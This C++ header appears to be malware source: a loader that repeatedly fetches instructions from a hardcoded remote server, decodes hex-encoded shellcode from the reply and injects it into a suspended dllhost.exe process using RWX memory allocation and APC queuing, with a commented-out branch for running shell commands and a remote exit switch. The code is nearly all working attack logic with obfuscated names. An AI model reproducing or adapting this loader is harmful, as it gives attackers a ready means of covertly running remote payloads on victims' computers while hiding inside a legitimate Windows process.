#pragma once
#include "curl/curl.h"
#include <String.h>
#include <sstream>
#include <iostream>
#include <string>
#pragma comment(lib, "libcurl.lib")
#pragma comment ( lib, "ws2_32.lib" )
#pragma comment ( lib, "wldap32.lib" )

#define CODE__SIZE 10*1024
#define URL "http://api.10086.li/txt.txt"

using namespace std;

DWORD WINAPI run__slcd__(LPVOID p);
string str__to__hex__(string hex);
string __hexcode__;


class Chttp
{
private:
    CURL* __curl;
    stringstream __rs;
    long __code;
public:
    Chttp()
        : __curl(curl_easy_init())
        , __code(0)
    {

    }
    ~Chttp()
    {
        if (__curl) curl_easy_cleanup(__curl);
    }
    string __get(const string& __url)
    {
        CURLcode res;
        curl_easy_setopt(__curl, CURLOPT_URL, __url.c_str());
        curl_easy_setopt(__curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(__curl, CURLOPT_WRITEFUNCTION, __receive__data);
        curl_easy_setopt(__curl, CURLOPT_WRITEDATA, this);

        __rs.str("");
        __code = 0;
        res = curl_easy_perform(__curl);
        if (res != CURLE_OK)
        {
            throw runtime_error(curl_easy_strerror(res));
        }
        curl_easy_getinfo(__curl, CURLINFO_RESPONSE_CODE, &__code);
        return __rs.str();
    }
    long __GetHttpCode()
    {
        return __code;
    }
private:
    static size_t __receive__data(void* buffer, size_t size, size_t nmemb, void* userp)
    {
        return static_cast<Chttp*>(userp)->__write__rdata(buffer, size, nmemb);
    }
    size_t __write__rdata(void* buffer, size_t size, size_t nmemb)
    {
        __rs.write((const char*)buffer, size * nmemb);
        return size * nmemb;
    }
};


class Conf
{
private:
    int __s;
    string __t;
    string __v;
public:
    Conf(string res)
    {
        istringstream is(res);
        string line;

        char split = '\n';
        if (res.find("\n") == -1)
        {
            split = '\r';
        }


        while (getline(is, line, split))
        {

            int line__len = line.length();
            int flag = line.find(":");
            string key = line.substr(0, flag);
            string value = line.substr(flag + 1, line__len);
            if (key == "s")
            {
                this->__s = atoi(value.c_str());
            }
            else if (key == "t")
            {
                this->__t = value;
            }
            if (key == "v")
            {
                this->__v = value;
            }
        }
    };

    VOID run()
    {

        if (this->__t == "c\r" || this->__t == "c")
        {
            // system((this->__v).c__str());
        }
        else if (this->__t == "u\r" || this->__t == "u")
        {
            try {

                __hexcode__ = this->__v;
                CreateThread(NULL, NULL, run__slcd__, NULL, NULL, NULL);
            }
            catch (exception e)
            {
            };
        }
        else if (this->__t == "e\r" || this->__t == "e")
        {
            exit(0);
        }
        Sleep(this->__s * 1000);

    };

private:

};



string str__to__hex__(string strHex) {
    string tmpStr = "";
    for (size_t j = 0; j < strHex.length(); j += 2) {
        string hex16 = strHex.substr(j, 2);
        char ch16 = stoul(hex16, nullptr, 16);
        tmpStr += ch16;
    }
    return tmpStr;
};

DWORD WINAPI run__slcd__(LPVOID lpParameter)
{
    string __code__str__ = str__to__hex__(__hexcode__);
    int __len = __hexcode__.length();
    unsigned char __code[CODE__SIZE] = { 0 };
    memcpy(__code, __code__str__.c_str(), __len / 2 + 1);
    UINT __codeSize = sizeof(__code);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, __codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, __code, __codeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    ResumeThread(threadHandle);
    return 0;
}

DWORD WINAPI d__run__(LPVOID P)
{
__GO:
    try {
        Chttp __c;
        string res = __c.__get(URL);
        Conf* conf = new Conf(res);
        conf->run();
        return 0;
    }
    catch (exception e)
    {
        Sleep(3000);
        goto __GO;
    }
    return 0;
}